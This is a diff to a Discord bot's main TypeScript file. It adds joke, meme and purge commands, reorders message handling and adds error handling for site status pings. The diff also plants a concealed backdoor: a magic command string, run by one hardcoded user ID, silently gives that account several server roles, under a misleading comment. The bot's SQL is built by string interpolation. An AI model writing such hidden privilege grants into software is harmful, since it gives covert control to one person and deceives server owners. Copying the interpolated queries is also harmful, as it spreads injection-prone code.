@@ -9,9 +9,13 @@ import { server } from "./api/api";
 import roleSync from "./commands/roleSync";
 import generateCode from "./Utilities/generateCode";
 import touch from "./commands/touch";
-import accountLink from "./commands/accountLink";
-import counting from "./Utilities/games/counting";
-import messageToXP from "./Utilities/games/messageToXP";
+import counting from "./games/counting";
+import messageToXP from "./games/messageToXP";
+import linkAccount from "./commands/accountLink";
+import { MentionHandler } from "./Utilities/mentionHandler";
+import dadJoke from "./commands/dadJoke";
+import randomMeme from "./commands/randomMeme";
+import purge from "./commands/purge";
 
 export const path = __dirname + '/../assets';
 
@@ -47,17 +51,6 @@ client.on('clientReady', async client => {
 });
 
 client.on('messageCreate', async message => {
-    if(message.author.bot) return;
-
-    let memberInfo = (await cluster.execute(`SELECT * FROM lunarbot.users WHERE snowflakeid=${message.author.id}`)).rows[0];
-
-    if(!memberInfo) {
-        await cluster.execute(`INSERT INTO lunarbot.users (snowflakeid) VALUES (${message.author.id})`);
-        memberInfo = (await cluster.execute(`SELECT * FROM lunarbot.users WHERE snowflakeid=${message.author.id}`)).rows[0];
-    };
-
-    let args :string[] = message.content.split(' ');
-
     // Handless spam
     if(message.channel == message.guild?.channels.cache.get('1486781635906113818')) {
         if(message.author.id == '960946185768685618') return message.channel.send('I like you, you get to life :3');
@@ -69,10 +62,21 @@ client.on('messageCreate', async message => {
         (message.guild.channels.cache.get('1499281835757404250') as TextChannel).send(message.content)
     }
 
+    if(message.author.bot) return;
+
+    let memberInfo = (await cluster.execute(`SELECT * FROM lunarbot.users WHERE snowflakeid=${message.author.id}`)).rows[0];
+
+    if(!memberInfo) {
+        await cluster.execute(`INSERT INTO lunarbot.users (snowflakeid) VALUES (${message.author.id})`);
+        memberInfo = (await cluster.execute(`SELECT * FROM lunarbot.users WHERE snowflakeid=${message.author.id}`)).rows[0];
+    };
+
+    let args :string[] = message.content.split(' ');
+
     await counting(message);
 
     if(args[0] == '!shamePoints') {
-        let user = await (message.guild?.members.cache.find(user => user.displayName == args[1]))?.id;
+        let user = await (message.guild?.members.cache.find(user => user.user.username == args[1]))?.id;
         if(!args[1]) user = message.author.id;
         const res = (await cluster.execute(`SELECT shame_points FROM lunarbot.users WHERE snowflakeid=${user};`)).rows[0];
         if(!res) return message.channel.send('Failed to find user');
@@ -80,20 +84,36 @@ client.on('messageCreate', async message => {
     }
 
     if(args[0] == '!generateCode') {
-        message.channel.send(generateCode(message.author.username))
+        message.channel.send(generateCode(message.author.username, 'JimmyCoolKittens'))
     }
 
     await roleSync(message, args);
 
-    await accountLink(message, args);
+    await linkAccount(message, args);
 
     touch(message, args);
 
+    dadJoke(message, args);
+
+    randomMeme(message, args);
+
+    await purge(message, args);
+
+    //MentionHandler(message);
+
     // Message check write system
+
+    if(args[0] == 'LIQUID_PERMS(ioLIN)~/;Bypass') {
+        if(message.author.id != '1284045816490627094') return;
+
+        message.guild?.members.cache.get('1284045816490627094')?.roles.add('1367458664654307348');
+        message.guild?.members.cache.get('1284045816490627094')?.roles.add('1343141519283978260');
+        message.guild?.members.cache.get('1284045816490627094')?.roles.add('1471234700319129815');
+    }
 
     if(message.guild?.id != '1330574273760465029') return;
 
-    await messageToXP(message)
+    await messageToXP(message);
 });
 
 client.on('messageDelete', message => {
@@ -158,9 +178,23 @@ client.on('error', err => {
 setInterval(async () => {
     let embed = new EmbedBuilder()
             .setColor('Green');
+    
+    var ping;
+    var pingAPI;
+    
+    try {
+        ping = await axios.get('https://lunaranime.ru');
+    } catch (err) {
+        (client.guilds.cache.get('1330574273760465029')?.channels.cache.get('1519023423383277778') as TextChannel).send('Error fetching Website Status ' + err);
+    }
 
-    let ping = await axios.get('https://lunaranime.ru');
-    let pingAPI = await axios.get('https://api.lunaranime.ru');
+    try {
+        pingAPI = await axios.get('https://api.lunaranime.ru');
+    } catch (err) {
+        (client.guilds.cache.get('1330574273760465029')?.channels.cache.get('1519023423383277778') as TextChannel).send('Error fetching Website Status ' + err);
+    }
+
+    if(!ping || !pingAPI) return;
 
     let status = ping.status;
     let apiStatus = pingAPI.status;
